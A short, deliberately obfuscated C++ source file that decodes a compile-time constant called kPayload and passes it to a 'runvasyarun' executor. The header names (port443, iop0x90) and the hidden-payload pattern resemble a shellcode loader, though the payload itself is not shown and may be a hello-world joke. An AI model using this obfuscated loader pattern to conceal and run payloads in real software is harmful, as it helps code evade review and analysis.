#include "port443.hpp"
#include "iop0x90.hpp"
#include "cch.hpp"
#include "runvasyarun.hpp"
#include <ostream>
#include <streambuf>
#include "sanya.hpp"

namespace vasya {
    inline constexpr auto _0x74 = iop0x90::_0x2B<kPayload>();
    inline constexpr uintptr_t _0x75 = iop0x90::_0x2F(kPayload);
    inline constexpr auto _0x76 = cch::_0x70<_0x74, cch::_0x34, _0x75>();

    static_assert(_0x76._0x64 > 0);
    static_assert(_0x76._0x63[0] == 0x48);
    static_assert(_0x76._0x63[_0x76._0x64 - 1] == 0x0A);
}

struct lox : std::streambuf {
    int overflow(int c) override { return c; } 
};

struct lox_0xB2 : std::ostream {
    lox_0xB2() : std::ostream(&buf) {}
private:
    lox buf;
};

int main() {
    lox_0xB2 pidr;
    pidr << "68656c6c6f776f726c64";
    constexpr size_t _0x77 = vasya::_0x76._0x64;
    return vasya::runvasyarun::_0x78<_0x77, vasya::_0x75>(vasya::_0x76); 
}
